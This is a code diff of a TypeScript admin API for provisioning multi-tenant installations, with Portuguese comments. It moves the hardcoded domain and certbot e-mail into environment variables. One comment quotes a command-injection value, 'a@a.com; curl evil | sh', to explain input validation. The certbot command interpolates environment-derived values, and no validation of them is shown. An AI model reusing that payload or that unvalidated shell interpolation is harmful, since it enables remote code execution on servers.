@@ -94,15 +94,36 @@ function getProjectSource(): string {
 }
 
 /**
+ * Domínio base das instalações: BASE_DOMAIN do .env (o mesmo do installer/
+ * setup.sh) ou, sem ele, o primeiro host de MARKETING_HOST. Nada fixo aqui.
+ * Na instalação principal BASE_DOMAIN é obrigatório na prática: MARKETING_HOST
+ * pode começar pelo domínio antigo da marca.
+ */
+function dominioBase(): string {
+  const base = (process.env.BASE_DOMAIN || '').trim()
+  if (base) return base.replace(/^\.+/, '')
+  return (process.env.MARKETING_HOST || '').split(',')[0]?.trim() || ''
+}
+function dominioDe(sub: string): string {
+  const base = dominioBase()
+  if (!base) throw new Error('Defina BASE_DOMAIN no .env da instalação principal para criar instalações.')
+  return `${sub}.${base}`
+}
+/** E-mail do Let's Encrypt e do admin padrão: CERTBOT_EMAIL ou admin@<domínio base>. */
+function emailPadrao(): string {
+  return (process.env.CERTBOT_EMAIL || '').trim() || `admin@${dominioBase()}`
+}
+
+/**
  * Lê o domain real do .env do tenant (APP_URL ou MARKETING_HOST).
- * Cai pra `<sub>.bychat.ia.br` se nada estiver configurado.
+ * Cai pra `<sub>.<domínio base>` se nada estiver configurado.
  *
- * Importante pra tenant principal (beyond): o domain é "bychat.ia.br",
- * não "beyond.bychat.ia.br". Sem isso, a UI mostrava o subdomain como
+ * Importante pra instalação principal: o domain dela é o próprio domínio
+ * base, não "<sub>.<base>". Sem isso, a UI mostrava o subdomain como
  * host fictício e o cert SSL aparecia ausente.
  */
 function resolveDomain(sub: string, envContent?: string | null): string {
-  const fallback = `${sub}.bychat.ia.br`
+  const fallback = dominioBase() ? `${sub}.${dominioBase()}` : sub
   if (!envContent) return fallback
   const appUrlMatch = envContent.match(/^APP_URL=["']?https?:\/\/([^"'\s/]+)/m)
   if (appUrlMatch?.[1]) return appUrlMatch[1].trim()
@@ -180,7 +201,7 @@ function listInstallations(): Installation[] {
       health = code === '200'
     }
 
-    // SSL — checa o domain real (bychat.ia.br para o principal, terram.bychat.ia.br etc.)
+    // SSL — checa o domain real (o domínio base para a principal, <sub>.<base> para as demais)
     const ssl = existsSync(`/etc/letsencrypt/live/${domain}/fullchain.pem`)
 
     installations.push({
@@ -205,7 +226,7 @@ async function provision(data: ProvisionRequest, logFn: (msg: string) => void): 
   const sub = data.subdomain.toLowerCase().replace(/[^a-z0-9-]/g, '')
   if (!sub) return { success: false, error: 'Subdomínio inválido' }
 
-  const domain = `${sub}.bychat.ia.br`
+  const domain = dominioDe(sub)
   const dir = `/var/www/bychat-${sub}`
   const mysqlContainer = `bychat-mysql-${sub}`
   const pm2Name = `bychat-${sub}`
@@ -216,7 +237,7 @@ async function provision(data: ProvisionRequest, logFn: (msg: string) => void): 
   const mysqlPass = generatePassword(20)
   const jwtSecret = execSync('openssl rand -base64 48', { encoding: 'utf-8' }).trim()
   const adminPass = data.adminPass || generatePassword(12)
-  const adminEmail = data.adminEmail || 'admin@bychat.ia.br'
+  const adminEmail = data.adminEmail || emailPadrao()
   // adminEmail é interpolado em comandos de shell (certbot) e escrito no .env.
   // Validação estrita (charset seguro, sem metacaracteres de shell) impede
   // command injection — ex.: "a@a.com; curl evil | sh".
@@ -386,7 +407,7 @@ export async function installationsRoutes(app: FastifyInstance) {
   // GET /api/admin/installations — Listar todas
   app.get('/api/admin/installations', { preHandler: superadminOnly }, async () => {
     const installations = listInstallations()
-    return { installations }
+    return { installations, dominioBase: dominioBase(), emailPadrao: emailPadrao() }
   })
 
   // POST /api/admin/installations — Provisionar nova
@@ -446,7 +467,7 @@ export async function installationsRoutes(app: FastifyInstance) {
   // POST /api/admin/installations/:sub/ssl — Gerar/renovar SSL
   app.post('/api/admin/installations/:sub/ssl', { preHandler: superadminOnly }, async (req) => {
     const sub = sanitizeSub((req.params as { sub: string }).sub)
-    // Lê domain real do .env (tenant principal usa bychat.ia.br, não beyond.bychat.ia.br).
+    // Lê domain real do .env (a principal usa o domínio base, não <sub>.<base>).
     const env = readEnvFile(`/var/www/bychat-${sub}`)
     const domain = resolveDomain(sub, env)
 
@@ -461,7 +482,7 @@ export async function installationsRoutes(app: FastifyInstance) {
       return { ok: false, error: 'DNS aponta para outro IP', detail: `${domain} → ${dnsIp} (esperado: ${myIp})` }
     }
 
-    const result = run(`certbot --nginx -d ${domain} --non-interactive --agree-tos --email admin@bychat.ia.br 2>&1`, { timeout: 60000 })
+    const result = run(`certbot --nginx -d ${domain} --non-interactive --agree-tos --email ${emailPadrao()} 2>&1`, { timeout: 60000 })
     const success = result.includes('Successfully') || result.includes('Certificate not yet due for renewal')
 
     return { ok: success, output: result }
@@ -507,7 +528,7 @@ export async function installationsRoutes(app: FastifyInstance) {
     steps.push('Diretório removido')
 
     // 5. Revogar SSL se existir
-    const domain = `${sub}.bychat.ia.br`
+    const domain = dominioDe(sub)
     if (existsSync(`/etc/letsencrypt/live/${domain}`)) {
       run(`certbot delete --cert-name ${domain} --non-interactive 2>&1`)
       steps.push('SSL revogado')
